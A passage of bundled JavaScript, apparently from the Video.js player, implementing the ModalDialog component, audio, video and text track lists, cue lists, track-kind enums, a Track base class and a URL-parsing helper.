   * Returns the label string for this modal. Primarily used for accessibility.
   *
   * @return {string}
   *         the localized or raw label of this modal.
   */


  ModalDialog.prototype.label = function label() {
    return this.localize(this.options_.label || 'Modal Window');
  };

  /**
   * Returns the description string for this modal. Primarily used for
   * accessibility.
   *
   * @return {string}
   *         The localized or raw description of this modal.
   */


  ModalDialog.prototype.description = function description() {
    var desc = this.options_.description || this.localize('This is a modal window.');

    // Append a universal closeability message if the modal is closeable.
    if (this.closeable()) {
      desc += ' ' + this.localize('This modal can be closed by pressing the Escape key or activating the close button.');
    }

    return desc;
  };

  /**
   * Opens the modal.
   *
   * @fires ModalDialog#beforemodalopen
   * @fires ModalDialog#modalopen
   */


  ModalDialog.prototype.open = function open() {
    if (!this.opened_) {
      var player = this.player();

      /**
        * Fired just before a `ModalDialog` is opened.
        *
        * @event ModalDialog#beforemodalopen
        * @type {EventTarget~Event}
        */
      this.trigger('beforemodalopen');
      this.opened_ = true;

      // Fill content if the modal has never opened before and
      // never been filled.
      if (this.options_.fillAlways || !this.hasBeenOpened_ && !this.hasBeenFilled_) {
        this.fill();
      }

      // If the player was playing, pause it and take note of its previously
      // playing state.
      this.wasPlaying_ = !player.paused();

      if (this.options_.pauseOnOpen && this.wasPlaying_) {
        player.pause();
      }

      if (this.closeable()) {
        this.on(this.el_.ownerDocument, 'keydown', bind(this, this.handleKeyPress));
      }

      // Hide controls and note if they were enabled.
      this.hadControls_ = player.controls();
      player.controls(false);

      this.show();
      this.conditionalFocus_();
      this.el().setAttribute('aria-hidden', 'false');

      /**
        * Fired just after a `ModalDialog` is opened.
        *
        * @event ModalDialog#modalopen
        * @type {EventTarget~Event}
        */
      this.trigger('modalopen');
      this.hasBeenOpened_ = true;
    }
  };

  /**
   * If the `ModalDialog` is currently open or closed.
   *
   * @param  {boolean} [value]
   *         If given, it will open (`true`) or close (`false`) the modal.
   *
   * @return {boolean}
   *         the current open state of the modaldialog
   */


  ModalDialog.prototype.opened = function opened(value) {
    if (typeof value === 'boolean') {
      this[value ? 'open' : 'close']();
    }
    return this.opened_;
  };

  /**
   * Closes the modal, does nothing if the `ModalDialog` is
   * not open.
   *
   * @fires ModalDialog#beforemodalclose
   * @fires ModalDialog#modalclose
   */


  ModalDialog.prototype.close = function close() {
    if (!this.opened_) {
      return;
    }
    var player = this.player();

    /**
      * Fired just before a `ModalDialog` is closed.
      *
      * @event ModalDialog#beforemodalclose
      * @type {EventTarget~Event}
      */
    this.trigger('beforemodalclose');
    this.opened_ = false;

    if (this.wasPlaying_ && this.options_.pauseOnOpen) {
      player.play();
    }

    if (this.closeable()) {
      this.off(this.el_.ownerDocument, 'keydown', bind(this, this.handleKeyPress));
    }

    if (this.hadControls_) {
      player.controls(true);
    }

    this.hide();
    this.el().setAttribute('aria-hidden', 'true');

    /**
      * Fired just after a `ModalDialog` is closed.
      *
      * @event ModalDialog#modalclose
      * @type {EventTarget~Event}
      */
    this.trigger('modalclose');
    this.conditionalBlur_();

    if (this.options_.temporary) {
      this.dispose();
    }
  };

  /**
   * Check to see if the `ModalDialog` is closeable via the UI.
   *
   * @param  {boolean} [value]
   *         If given as a boolean, it will set the `closeable` option.
   *
   * @return {boolean}
   *         Returns the final value of the closable option.
   */


  ModalDialog.prototype.closeable = function closeable(value) {
    if (typeof value === 'boolean') {
      var closeable = this.closeable_ = !!value;
      var close = this.getChild('closeButton');

      // If this is being made closeable and has no close button, add one.
      if (closeable && !close) {

        // The close button should be a child of the modal - not its
        // content element, so temporarily change the content element.
        var temp = this.contentEl_;

        this.contentEl_ = this.el_;
        close = this.addChild('closeButton', { controlText: 'Close Modal Dialog' });
        this.contentEl_ = temp;
        this.on(close, 'close', this.close);
      }

      // If this is being made uncloseable and has a close button, remove it.
      if (!closeable && close) {
        this.off(close, 'close', this.close);
        this.removeChild(close);
        close.dispose();
      }
    }
    return this.closeable_;
  };

  /**
   * Fill the modal's content element with the modal's "content" option.
   * The content element will be emptied before this change takes place.
   */


  ModalDialog.prototype.fill = function fill() {
    this.fillWith(this.content());
  };

  /**
   * Fill the modal's content element with arbitrary content.
   * The content element will be emptied before this change takes place.
   *
   * @fires ModalDialog#beforemodalfill
   * @fires ModalDialog#modalfill
   *
   * @param {Mixed} [content]
   *        The same rules apply to this as apply to the `content` option.
   */


  ModalDialog.prototype.fillWith = function fillWith(content) {
    var contentEl = this.contentEl();
    var parentEl = contentEl.parentNode;
    var nextSiblingEl = contentEl.nextSibling;

    /**
     * Fired just before a `ModalDialog` is filled with content.
     *
     * @event ModalDialog#beforemodalfill
     * @type {EventTarget~Event}
     */
    this.trigger('beforemodalfill');
    this.hasBeenFilled_ = true;

    // Detach the content element from the DOM before performing
    // manipulation to avoid modifying the live DOM multiple times.
    parentEl.removeChild(contentEl);
    this.empty();
    insertContent(contentEl, content);
    /**
     * Fired just after a `ModalDialog` is filled with content.
     *
     * @event ModalDialog#modalfill
     * @type {EventTarget~Event}
     */
    this.trigger('modalfill');

    // Re-inject the re-filled content element.
    if (nextSiblingEl) {
      parentEl.insertBefore(contentEl, nextSiblingEl);
    } else {
      parentEl.appendChild(contentEl);
    }

    // make sure that the close button is last in the dialog DOM
    var closeButton = this.getChild('closeButton');

    if (closeButton) {
      parentEl.appendChild(closeButton.el_);
    }
  };

  /**
   * Empties the content element. This happens anytime the modal is filled.
   *
   * @fires ModalDialog#beforemodalempty
   * @fires ModalDialog#modalempty
   */


  ModalDialog.prototype.empty = function empty() {
    /**
     * Fired just before a `ModalDialog` is emptied.
     *
     * @event ModalDialog#beforemodalempty
     * @type {EventTarget~Event}
     */
    this.trigger('beforemodalempty');
    emptyEl(this.contentEl());

    /**
     * Fired just after a `ModalDialog` is emptied.
     *
     * @event ModalDialog#modalempty
     * @type {EventTarget~Event}
     */
    this.trigger('modalempty');
  };

  /**
   * Gets or sets the modal content, which gets normalized before being
   * rendered into the DOM.
   *
   * This does not update the DOM or fill the modal, but it is called during
   * that process.
   *
   * @param  {Mixed} [value]
   *         If defined, sets the internal content value to be used on the
   *         next call(s) to `fill`. This value is normalized before being
   *         inserted. To "clear" the internal content value, pass `null`.
   *
   * @return {Mixed}
   *         The current content of the modal dialog
   */


  ModalDialog.prototype.content = function content(value) {
    if (typeof value !== 'undefined') {
      this.content_ = value;
    }
    return this.content_;
  };

  /**
   * conditionally focus the modal dialog if focus was previously on the player.
   *
   * @private
   */


  ModalDialog.prototype.conditionalFocus_ = function conditionalFocus_() {
    var activeEl = document_1.activeElement;
    var playerEl = this.player_.el_;

    this.previouslyActiveEl_ = null;

    if (playerEl.contains(activeEl) || playerEl === activeEl) {
      this.previouslyActiveEl_ = activeEl;

      this.focus();

      this.on(document_1, 'keydown', this.handleKeyDown);
    }
  };

  /**
   * conditionally blur the element and refocus the last focused element
   *
   * @private
   */


  ModalDialog.prototype.conditionalBlur_ = function conditionalBlur_() {
    if (this.previouslyActiveEl_) {
      this.previouslyActiveEl_.focus();
      this.previouslyActiveEl_ = null;
    }

    this.off(document_1, 'keydown', this.handleKeyDown);
  };

  /**
   * Keydown handler. Attached when modal is focused.
   *
   * @listens keydown
   */


  ModalDialog.prototype.handleKeyDown = function handleKeyDown(event) {
    // exit early if it isn't a tab key
    if (event.which !== 9) {
      return;
    }

    var focusableEls = this.focusableEls_();
    var activeEl = this.el_.querySelector(':focus');
    var focusIndex = void 0;

    for (var i = 0; i < focusableEls.length; i++) {
      if (activeEl === focusableEls[i]) {
        focusIndex = i;
        break;
      }
    }

    if (document_1.activeElement === this.el_) {
      focusIndex = 0;
    }

    if (event.shiftKey && focusIndex === 0) {
      focusableEls[focusableEls.length - 1].focus();
      event.preventDefault();
    } else if (!event.shiftKey && focusIndex === focusableEls.length - 1) {
      focusableEls[0].focus();
      event.preventDefault();
    }
  };

  /**
   * get all focusable elements
   *
   * @private
   */


  ModalDialog.prototype.focusableEls_ = function focusableEls_() {
    var allChildren = this.el_.querySelectorAll('*');

    return Array.prototype.filter.call(allChildren, function (child) {
      return (child instanceof window_1.HTMLAnchorElement || child instanceof window_1.HTMLAreaElement) && child.hasAttribute('href') || (child instanceof window_1.HTMLInputElement || child instanceof window_1.HTMLSelectElement || child instanceof window_1.HTMLTextAreaElement || child instanceof window_1.HTMLButtonElement) && !child.hasAttribute('disabled') || child instanceof window_1.HTMLIFrameElement || child instanceof window_1.HTMLObjectElement || child instanceof window_1.HTMLEmbedElement || child.hasAttribute('tabindex') && child.getAttribute('tabindex') !== -1 || child.hasAttribute('contenteditable');
    });
  };

  return ModalDialog;
}(Component);

/**
 * Default options for `ModalDialog` default options.
 *
 * @type {Object}
 * @private
 */


ModalDialog.prototype.options_ = {
  pauseOnOpen: true,
  temporary: true
};

Component.registerComponent('ModalDialog', ModalDialog);

/**
 * @file track-list.js
 */
/**
 * Common functionaliy between {@link TextTrackList}, {@link AudioTrackList}, and
 * {@link VideoTrackList}
 *
 * @extends EventTarget
 */

var TrackList = function (_EventTarget) {
  inherits(TrackList, _EventTarget);

  /**
   * Create an instance of this class
   *
   * @param {Track[]} tracks
   *        A list of tracks to initialize the list with.
   *
   * @param {Object} [list]
   *        The child object with inheritance done manually for ie8.
   *
   * @abstract
   */
  function TrackList() {
    var tracks = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];

    var _ret;

    var list = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : null;
    classCallCheck(this, TrackList);

    var _this = possibleConstructorReturn(this, _EventTarget.call(this));

    if (!list) {
      list = _this; // eslint-disable-line
      if (IS_IE8) {
        list = document_1.createElement('custom');
        for (var prop in TrackList.prototype) {
          if (prop !== 'constructor') {
            list[prop] = TrackList.prototype[prop];
          }
        }
      }
    }

    list.tracks_ = [];

    /**
     * @memberof TrackList
     * @member {number} length
     *         The current number of `Track`s in the this Trackist.
     * @instance
     */
    Object.defineProperty(list, 'length', {
      get: function get$$1() {
        return this.tracks_.length;
      }
    });

    for (var i = 0; i < tracks.length; i++) {
      list.addTrack(tracks[i]);
    }

    // must return the object, as for ie8 it will not be this
    // but a reference to a document object
    return _ret = list, possibleConstructorReturn(_this, _ret);
  }

  /**
   * Add a {@link Track} to the `TrackList`
   *
   * @param {Track} track
   *        The audio, video, or text track to add to the list.
   *
   * @fires TrackList#addtrack
   */


  TrackList.prototype.addTrack = function addTrack(track) {
    var index = this.tracks_.length;

    if (!('' + index in this)) {
      Object.defineProperty(this, index, {
        get: function get$$1() {
          return this.tracks_[index];
        }
      });
    }

    // Do not add duplicate tracks
    if (this.tracks_.indexOf(track) === -1) {
      this.tracks_.push(track);
      /**
       * Triggered when a track is added to a track list.
       *
       * @event TrackList#addtrack
       * @type {EventTarget~Event}
       * @property {Track} track
       *           A reference to track that was added.
       */
      this.trigger({
        track: track,
        type: 'addtrack'
      });
    }
  };

  /**
   * Remove a {@link Track} from the `TrackList`
   *
   * @param {Track} rtrack
   *        The audio, video, or text track to remove from the list.
   *
   * @fires TrackList#removetrack
   */


  TrackList.prototype.removeTrack = function removeTrack(rtrack) {
    var track = void 0;

    for (var i = 0, l = this.length; i < l; i++) {
      if (this[i] === rtrack) {
        track = this[i];
        if (track.off) {
          track.off();
        }

        this.tracks_.splice(i, 1);

        break;
      }
    }

    if (!track) {
      return;
    }

    /**
     * Triggered when a track is removed from track list.
     *
     * @event TrackList#removetrack
     * @type {EventTarget~Event}
     * @property {Track} track
     *           A reference to track that was removed.
     */
    this.trigger({
      track: track,
      type: 'removetrack'
    });
  };

  /**
   * Get a Track from the TrackList by a tracks id
   *
   * @param {String} id - the id of the track to get
   * @method getTrackById
   * @return {Track}
   * @private
   */


  TrackList.prototype.getTrackById = function getTrackById(id) {
    var result = null;

    for (var i = 0, l = this.length; i < l; i++) {
      var track = this[i];

      if (track.id === id) {
        result = track;
        break;
      }
    }

    return result;
  };

  return TrackList;
}(EventTarget);

/**
 * Triggered when a different track is selected/enabled.
 *
 * @event TrackList#change
 * @type {EventTarget~Event}
 */

/**
 * Events that can be called with on + eventName. See {@link EventHandler}.
 *
 * @property {Object} TrackList#allowedEvents_
 * @private
 */


TrackList.prototype.allowedEvents_ = {
  change: 'change',
  addtrack: 'addtrack',
  removetrack: 'removetrack'
};

// emulate attribute EventHandler support to allow for feature detection
for (var event in TrackList.prototype.allowedEvents_) {
  TrackList.prototype['on' + event] = null;
}

/**
 * @file audio-track-list.js
 */
/**
 * Anywhere we call this function we diverge from the spec
 * as we only support one enabled audiotrack at a time
 *
 * @param {AudioTrackList} list
 *        list to work on
 *
 * @param {AudioTrack} track
 *        The track to skip
 *
 * @private
 */
var disableOthers = function disableOthers(list, track) {
  for (var i = 0; i < list.length; i++) {
    if (!Object.keys(list[i]).length || track.id === list[i].id) {
      continue;
    }
    // another audio track is enabled, disable it
    list[i].enabled = false;
  }
};

/**
 * The current list of {@link AudioTrack} for a media file.
 *
 * @see [Spec]{@link https://html.spec.whatwg.org/multipage/embedded-content.html#audiotracklist}
 * @extends TrackList
 */

var AudioTrackList = function (_TrackList) {
  inherits(AudioTrackList, _TrackList);

  /**
   * Create an instance of this class.
   *
   * @param {AudioTrack[]} [tracks=[]]
   *        A list of `AudioTrack` to instantiate the list with.
   */
  function AudioTrackList() {
    var _this, _ret;

    var tracks = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];
    classCallCheck(this, AudioTrackList);

    var list = void 0;

    // make sure only 1 track is enabled
    // sorted from last index to first index
    for (var i = tracks.length - 1; i >= 0; i--) {
      if (tracks[i].enabled) {
        disableOthers(tracks, tracks[i]);
        break;
      }
    }

    // IE8 forces us to implement inheritance ourselves
    // as it does not support Object.defineProperty properly
    if (IS_IE8) {
      list = document_1.createElement('custom');
      for (var prop in TrackList.prototype) {
        if (prop !== 'constructor') {
          list[prop] = TrackList.prototype[prop];
        }
      }
      for (var _prop in AudioTrackList.prototype) {
        if (_prop !== 'constructor') {
          list[_prop] = AudioTrackList.prototype[_prop];
        }
      }
    }

    list = (_this = possibleConstructorReturn(this, _TrackList.call(this, tracks, list)), _this);
    list.changing_ = false;

    return _ret = list, possibleConstructorReturn(_this, _ret);
  }

  /**
   * Add an {@link AudioTrack} to the `AudioTrackList`.
   *
   * @param {AudioTrack} track
   *        The AudioTrack to add to the list
   *
   * @fires TrackList#addtrack
   */


  AudioTrackList.prototype.addTrack = function addTrack(track) {
    var _this2 = this;

    if (track.enabled) {
      disableOthers(this, track);
    }

    _TrackList.prototype.addTrack.call(this, track);
    // native tracks don't have this
    if (!track.addEventListener) {
      return;
    }

    /**
     * @listens AudioTrack#enabledchange
     * @fires TrackList#change
     */
    track.addEventListener('enabledchange', function () {
      // when we are disabling other tracks (since we don't support
      // more than one track at a time) we will set changing_
      // to true so that we don't trigger additional change events
      if (_this2.changing_) {
        return;
      }
      _this2.changing_ = true;
      disableOthers(_this2, track);
      _this2.changing_ = false;
      _this2.trigger('change');
    });
  };

  return AudioTrackList;
}(TrackList);

/**
 * @file video-track-list.js
 */
/**
 * Un-select all other {@link VideoTrack}s that are selected.
 *
 * @param {VideoTrackList} list
 *        list to work on
 *
 * @param {VideoTrack} track
 *        The track to skip
 *
 * @private
 */
var disableOthers$1 = function disableOthers(list, track) {
  for (var i = 0; i < list.length; i++) {
    if (!Object.keys(list[i]).length || track.id === list[i].id) {
      continue;
    }
    // another video track is enabled, disable it
    list[i].selected = false;
  }
};

/**
 * The current list of {@link VideoTrack} for a video.
 *
 * @see [Spec]{@link https://html.spec.whatwg.org/multipage/embedded-content.html#videotracklist}
 * @extends TrackList
 */

var VideoTrackList = function (_TrackList) {
  inherits(VideoTrackList, _TrackList);

  /**
   * Create an instance of this class.
   *
   * @param {VideoTrack[]} [tracks=[]]
   *        A list of `VideoTrack` to instantiate the list with.
   */
  function VideoTrackList() {
    var _this, _ret;

    var tracks = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];
    classCallCheck(this, VideoTrackList);

    var list = void 0;

    // make sure only 1 track is enabled
    // sorted from last index to first index
    for (var i = tracks.length - 1; i >= 0; i--) {
      if (tracks[i].selected) {
        disableOthers$1(tracks, tracks[i]);
        break;
      }
    }

    // IE8 forces us to implement inheritance ourselves
    // as it does not support Object.defineProperty properly
    if (IS_IE8) {
      list = document_1.createElement('custom');
      for (var prop in TrackList.prototype) {
        if (prop !== 'constructor') {
          list[prop] = TrackList.prototype[prop];
        }
      }
      for (var _prop in VideoTrackList.prototype) {
        if (_prop !== 'constructor') {
          list[_prop] = VideoTrackList.prototype[_prop];
        }
      }
    }

    list = (_this = possibleConstructorReturn(this, _TrackList.call(this, tracks, list)), _this);
    list.changing_ = false;

    /**
     * @member {number} VideoTrackList#selectedIndex
     *         The current index of the selected {@link VideoTrack`}.
     */
    Object.defineProperty(list, 'selectedIndex', {
      get: function get$$1() {
        for (var _i = 0; _i < this.length; _i++) {
          if (this[_i].selected) {
            return _i;
          }
        }
        return -1;
      },
      set: function set$$1() {}
    });

    return _ret = list, possibleConstructorReturn(_this, _ret);
  }

  /**
   * Add a {@link VideoTrack} to the `VideoTrackList`.
   *
   * @param {VideoTrack} track
   *        The VideoTrack to add to the list
   *
   * @fires TrackList#addtrack
   */


  VideoTrackList.prototype.addTrack = function addTrack(track) {
    var _this2 = this;

    if (track.selected) {
      disableOthers$1(this, track);
    }

    _TrackList.prototype.addTrack.call(this, track);
    // native tracks don't have this
    if (!track.addEventListener) {
      return;
    }

    /**
     * @listens VideoTrack#selectedchange
     * @fires TrackList#change
     */
    track.addEventListener('selectedchange', function () {
      if (_this2.changing_) {
        return;
      }
      _this2.changing_ = true;
      disableOthers$1(_this2, track);
      _this2.changing_ = false;
      _this2.trigger('change');
    });
  };

  return VideoTrackList;
}(TrackList);

/**
 * @file text-track-list.js
 */
/**
 * The current list of {@link TextTrack} for a media file.
 *
 * @see [Spec]{@link https://html.spec.whatwg.org/multipage/embedded-content.html#texttracklist}
 * @extends TrackList
 */

var TextTrackList = function (_TrackList) {
  inherits(TextTrackList, _TrackList);

  /**
   * Create an instance of this class.
   *
   * @param {TextTrack[]} [tracks=[]]
   *        A list of `TextTrack` to instantiate the list with.
   */
  function TextTrackList() {
    var _this, _ret;

    var tracks = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];
    classCallCheck(this, TextTrackList);

    var list = void 0;

    // IE8 forces us to implement inheritance ourselves
    // as it does not support Object.defineProperty properly
    if (IS_IE8) {
      list = document_1.createElement('custom');
      for (var prop in TrackList.prototype) {
        if (prop !== 'constructor') {
          list[prop] = TrackList.prototype[prop];
        }
      }
      for (var _prop in TextTrackList.prototype) {
        if (_prop !== 'constructor') {
          list[_prop] = TextTrackList.prototype[_prop];
        }
      }
    }

    list = (_this = possibleConstructorReturn(this, _TrackList.call(this, tracks, list)), _this);
    return _ret = list, possibleConstructorReturn(_this, _ret);
  }

  /**
   * Add a {@link TextTrack} to the `TextTrackList`
   *
   * @param {TextTrack} track
   *        The text track to add to the list.
   *
   * @fires TrackList#addtrack
   */


  TextTrackList.prototype.addTrack = function addTrack(track) {
    _TrackList.prototype.addTrack.call(this, track);

    /**
     * @listens TextTrack#modechange
     * @fires TrackList#change
     */
    track.addEventListener('modechange', bind(this, function () {
      this.trigger('change');
    }));

    var nonLanguageTextTrackKind = ['metadata', 'chapters'];

    if (nonLanguageTextTrackKind.indexOf(track.kind) === -1) {
      track.addEventListener('modechange', bind(this, function () {
        this.trigger('selectedlanguagechange');
      }));
    }
  };

  return TextTrackList;
}(TrackList);

/**
 * @file html-track-element-list.js
 */

/**
 * The current list of {@link HtmlTrackElement}s.
 */

var HtmlTrackElementList = function () {

  /**
   * Create an instance of this class.
   *
   * @param {HtmlTrackElement[]} [tracks=[]]
   *        A list of `HtmlTrackElement` to instantiate the list with.
   */
  function HtmlTrackElementList() {
    var trackElements = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];
    classCallCheck(this, HtmlTrackElementList);

    var list = this; // eslint-disable-line

    if (IS_IE8) {
      list = document_1.createElement('custom');

      for (var prop in HtmlTrackElementList.prototype) {
        if (prop !== 'constructor') {
          list[prop] = HtmlTrackElementList.prototype[prop];
        }
      }
    }

    list.trackElements_ = [];

    /**
     * @memberof HtmlTrackElementList
     * @member {number} length
     *         The current number of `Track`s in the this Trackist.
     * @instance
     */
    Object.defineProperty(list, 'length', {
      get: function get$$1() {
        return this.trackElements_.length;
      }
    });

    for (var i = 0, length = trackElements.length; i < length; i++) {
      list.addTrackElement_(trackElements[i]);
    }

    if (IS_IE8) {
      return list;
    }
  }

  /**
   * Add an {@link HtmlTrackElement} to the `HtmlTrackElementList`
   *
   * @param {HtmlTrackElement} trackElement
   *        The track element to add to the list.
   *
   * @private
   */


  HtmlTrackElementList.prototype.addTrackElement_ = function addTrackElement_(trackElement) {
    var index = this.trackElements_.length;

    if (!('' + index in this)) {
      Object.defineProperty(this, index, {
        get: function get$$1() {
          return this.trackElements_[index];
        }
      });
    }

    // Do not add duplicate elements
    if (this.trackElements_.indexOf(trackElement) === -1) {
      this.trackElements_.push(trackElement);
    }
  };

  /**
   * Get an {@link HtmlTrackElement} from the `HtmlTrackElementList` given an
   * {@link TextTrack}.
   *
   * @param {TextTrack} track
   *        The track associated with a track element.
   *
   * @return {HtmlTrackElement|undefined}
   *         The track element that was found or undefined.
   *
   * @private
   */


  HtmlTrackElementList.prototype.getTrackElementByTrack_ = function getTrackElementByTrack_(track) {
    var trackElement_ = void 0;

    for (var i = 0, length = this.trackElements_.length; i < length; i++) {
      if (track === this.trackElements_[i].track) {
        trackElement_ = this.trackElements_[i];

        break;
      }
    }

    return trackElement_;
  };

  /**
   * Remove a {@link HtmlTrackElement} from the `HtmlTrackElementList`
   *
   * @param {HtmlTrackElement} trackElement
   *        The track element to remove from the list.
   *
   * @private
   */


  HtmlTrackElementList.prototype.removeTrackElement_ = function removeTrackElement_(trackElement) {
    for (var i = 0, length = this.trackElements_.length; i < length; i++) {
      if (trackElement === this.trackElements_[i]) {
        this.trackElements_.splice(i, 1);

        break;
      }
    }
  };

  return HtmlTrackElementList;
}();

/**
 * @file text-track-cue-list.js
 */
/**
 * @typedef {Object} TextTrackCueList~TextTrackCue
 *
 * @property {string} id
 *           The unique id for this text track cue
 *
 * @property {number} startTime
 *           The start time for this text track cue
 *
 * @property {number} endTime
 *           The end time for this text track cue
 *
 * @property {boolean} pauseOnExit
 *           Pause when the end time is reached if true.
 *
 * @see [Spec]{@link https://html.spec.whatwg.org/multipage/embedded-content.html#texttrackcue}
 */

/**
 * A List of TextTrackCues.
 *
 * @see [Spec]{@link https://html.spec.whatwg.org/multipage/embedded-content.html#texttrackcuelist}
 */

var TextTrackCueList = function () {

  /**
   * Create an instance of this class..
   *
   * @param {Array} cues
   *        A list of cues to be initialized with
   */
  function TextTrackCueList(cues) {
    classCallCheck(this, TextTrackCueList);

    var list = this; // eslint-disable-line

    if (IS_IE8) {
      list = document_1.createElement('custom');

      for (var prop in TextTrackCueList.prototype) {
        if (prop !== 'constructor') {
          list[prop] = TextTrackCueList.prototype[prop];
        }
      }
    }

    TextTrackCueList.prototype.setCues_.call(list, cues);

    /**
     * @memberof TextTrackCueList
     * @member {number} length
     *         The current number of `TextTrackCue`s in the TextTrackCueList.
     * @instance
     */
    Object.defineProperty(list, 'length', {
      get: function get$$1() {
        return this.length_;
      }
    });

    if (IS_IE8) {
      return list;
    }
  }

  /**
   * A setter for cues in this list. Creates getters
   * an an index for the cues.
   *
   * @param {Array} cues
   *        An array of cues to set
   *
   * @private
   */


  TextTrackCueList.prototype.setCues_ = function setCues_(cues) {
    var oldLength = this.length || 0;
    var i = 0;
    var l = cues.length;

    this.cues_ = cues;
    this.length_ = cues.length;

    var defineProp = function defineProp(index) {
      if (!('' + index in this)) {
        Object.defineProperty(this, '' + index, {
          get: function get$$1() {
            return this.cues_[index];
          }
        });
      }
    };

    if (oldLength < l) {
      i = oldLength;

      for (; i < l; i++) {
        defineProp.call(this, i);
      }
    }
  };

  /**
   * Get a `TextTrackCue` that is currently in the `TextTrackCueList` by id.
   *
   * @param {string} id
   *        The id of the cue that should be searched for.
   *
   * @return {TextTrackCueList~TextTrackCue|null}
   *         A single cue or null if none was found.
   */


  TextTrackCueList.prototype.getCueById = function getCueById(id) {
    var result = null;

    for (var i = 0, l = this.length; i < l; i++) {
      var cue = this[i];

      if (cue.id === id) {
        result = cue;
        break;
      }
    }

    return result;
  };

  return TextTrackCueList;
}();

/**
 * @file track-kinds.js
 */

/**
 * All possible `VideoTrackKind`s
 *
 * @see https://html.spec.whatwg.org/multipage/embedded-content.html#dom-videotrack-kind
 * @typedef VideoTrack~Kind
 * @enum
 */
var VideoTrackKind = {
  alternative: 'alternative',
  captions: 'captions',
  main: 'main',
  sign: 'sign',
  subtitles: 'subtitles',
  commentary: 'commentary'
};

/**
 * All possible `AudioTrackKind`s
 *
 * @see https://html.spec.whatwg.org/multipage/embedded-content.html#dom-audiotrack-kind
 * @typedef AudioTrack~Kind
 * @enum
 */
var AudioTrackKind = {
  'alternative': 'alternative',
  'descriptions': 'descriptions',
  'main': 'main',
  'main-desc': 'main-desc',
  'translation': 'translation',
  'commentary': 'commentary'
};

/**
 * All possible `TextTrackKind`s
 *
 * @see https://html.spec.whatwg.org/multipage/embedded-content.html#dom-texttrack-kind
 * @typedef TextTrack~Kind
 * @enum
 */
var TextTrackKind = {
  subtitles: 'subtitles',
  captions: 'captions',
  descriptions: 'descriptions',
  chapters: 'chapters',
  metadata: 'metadata'
};

/**
 * All possible `TextTrackMode`s
 *
 * @see https://html.spec.whatwg.org/multipage/embedded-content.html#texttrackmode
 * @typedef TextTrack~Mode
 * @enum
 */
var TextTrackMode = {
  disabled: 'disabled',
  hidden: 'hidden',
  showing: 'showing'
};

/**
 * @file track.js
 */
/**
 * A Track class that contains all of the common functionality for {@link AudioTrack},
 * {@link VideoTrack}, and {@link TextTrack}.
 *
 * > Note: This class should not be used directly
 *
 * @see {@link https://html.spec.whatwg.org/multipage/embedded-content.html}
 * @extends EventTarget
 * @abstract
 */

var Track = function (_EventTarget) {
  inherits(Track, _EventTarget);

  /**
   * Create an instance of this class.
   *
   * @param {Object} [options={}]
   *        Object of option names and values
   *
   * @param {string} [options.kind='']
   *        A valid kind for the track type you are creating.
   *
   * @param {string} [options.id='vjs_track_' + Guid.newGUID()]
   *        A unique id for this AudioTrack.
   *
   * @param {string} [options.label='']
   *        The menu label for this track.
   *
   * @param {string} [options.language='']
   *        A valid two character language code.
   *
   * @abstract
   */
  function Track() {
    var _ret;

    var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
    classCallCheck(this, Track);

    var _this = possibleConstructorReturn(this, _EventTarget.call(this));

    var track = _this; // eslint-disable-line

    if (IS_IE8) {
      track = document_1.createElement('custom');
      for (var prop in Track.prototype) {
        if (prop !== 'constructor') {
          track[prop] = Track.prototype[prop];
        }
      }
    }

    var trackProps = {
      id: options.id || 'vjs_track_' + newGUID(),
      kind: options.kind || '',
      label: options.label || '',
      language: options.language || ''
    };

    /**
     * @memberof Track
     * @member {string} id
     *         The id of this track. Cannot be changed after creation.
     * @instance
     *
     * @readonly
     */

    /**
     * @memberof Track
     * @member {string} kind
     *         The kind of track that this is. Cannot be changed after creation.
     * @instance
     *
     * @readonly
     */

    /**
     * @memberof Track
     * @member {string} label
     *         The label of this track. Cannot be changed after creation.
     * @instance
     *
     * @readonly
     */

    /**
     * @memberof Track
     * @member {string} language
     *         The two letter language code for this track. Cannot be changed after
     *         creation.
     * @instance
     *
     * @readonly
     */

    var _loop = function _loop(key) {
      Object.defineProperty(track, key, {
        get: function get$$1() {
          return trackProps[key];
        },
        set: function set$$1() {}
      });
    };

    for (var key in trackProps) {
      _loop(key);
    }

    return _ret = track, possibleConstructorReturn(_this, _ret);
  }

  return Track;
}(EventTarget);

/**
 * @file url.js
 * @module url
 */
/**
 * @typedef {Object} url:URLObject
 *
 * @property {string} protocol
 *           The protocol of the url that was parsed.
 *
 * @property {string} hostname
 *           The hostname of the url that was parsed.
 *
 * @property {string} port
 *           The port of the url that was parsed.
 *
 * @property {string} pathname
 *           The pathname of the url that was parsed.
 *
 * @property {string} search
 *           The search query of the url that was parsed.
 *
 * @property {string} hash
 *           The hash of the url that was parsed.
 *
 * @property {string} host
 *           The host of the url that was parsed.
 */

/**
 * Resolve and parse the elements of a URL.
 *
 * @param  {String} url
 *         The url to parse
 *
 * @return {url:URLObject}
 *         An object of url details
 */
var parseUrl = function parseUrl(url) {
  var props = ['protocol', 'hostname', 'port', 'pathname', 'search', 'hash', 'host'];

  // add the url to an anchor and let the browser parse the URL
  var a = document_1.createElement('a');

  a.href = url;

  // IE8 (and 9?) Fix
  // ie8 doesn't parse the URL correctly until the anchor is actually
  // added to the body, and an innerHTML is needed to trigger the parsing
  var addToBody = a.host === '' && a.protocol !== 'file:';
  var div = void 0;

  if (addToBody) {
    div = document_1.createElement('div');
    div.innerHTML = '<a href="' + url + '"></a>';
    a = div.firstChild;
    // prevent the div from affecting layout
    div.setAttribute('style', 'display:none; position:absolute;');
    document_1.body.appendChild(div);
  }

  // Copy the specific URL properties to a new object
  // This is also needed for IE8 because the anchor loses its
  // properties when it's removed from the dom
  var details = {};

  for (var i = 0; i < props.length; i++) {
    details[props[i]] = a[props[i]];
  }

  // IE9 adds the port to the host property unlike everyone else. If
  // a port identifier is added for standard ports, strip it.
  if (details.protocol === 'http:') {
    details.host = details.host.replace(/:80$/, '');
  }

  if (details.protocol === 'https:') {
    details.host = details.host.replace(/:443$/, '');
  }

  if (!details.protocol) {
    details.protocol = window_1.location.protocol;
  }

  if (addToBody) {
    document_1.body.removeChild(div);
  }

  return details;
};

/**
 * Get absolute version of relative URL. Used to tell flash correct URL.
 *
 *
 * @param  {string} url
 *         URL to make absolute
 *
 * @return {string}
